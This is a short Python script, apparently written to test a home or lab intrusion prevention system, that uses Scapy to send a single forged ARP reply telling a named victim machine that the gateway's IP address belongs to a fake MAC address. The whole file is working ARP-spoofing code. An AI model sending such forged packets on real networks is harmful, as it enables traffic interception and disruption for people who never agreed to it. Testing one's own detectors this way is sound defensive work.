# test_arp_direct.py
from scapy.all import sendp, ARP, Ether

# --- CONFIG ---
gateway_ip = "10.149.253.151"
fake_mac = "00:11:22:33:44:55"

# Your NIPS PC's info (from ipconfig /all)
victim_ip = "10.149.253.131"
victim_mac = "E8-FB-1C-59-E1-FF"  # Your Physical Address
ATTACKER_INTERFACE = "Wi-Fi"
# --- END CONFIG ---

print(f"Sending DIRECT fake ARP reply to {victim_ip}...")
print(f"Claiming {gateway_ip} is at {fake_mac}")

# Scapy needs colons for MAC addresses, not hyphens
packet = Ether(dst=victim_mac.replace("-", ":")) / ARP(op=2, pdst=victim_ip, psrc=gateway_ip, hwsrc=fake_mac)

sendp(packet, iface=ATTACKER_INTERFACE, verbose=False) 
print("Fake packet sent! Check your NIPS console.")